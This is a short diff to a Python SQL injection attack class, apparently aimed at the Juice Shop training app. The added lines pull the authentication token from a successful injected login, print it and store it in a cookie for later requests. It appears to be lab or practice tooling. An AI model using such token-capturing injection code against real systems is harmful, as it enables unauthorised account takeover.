@@ -30,6 +30,12 @@ class SQL_injector(a.attack_inter):
                     print("Valid script: ", json_data['email'])
                     print(res_payload_dict)
                     #self.juice_session.cookies.save()
+                    new_token = res_payload_dict["authentication"]['token']
+                    print(new_token)
+
+                    new_cookie = a.COOKIE
+                    new_cookie["token"] = new_token
+                    a.write_cookie(new_cookie)
                     break
         else:
             headers, json_data = self.generator()
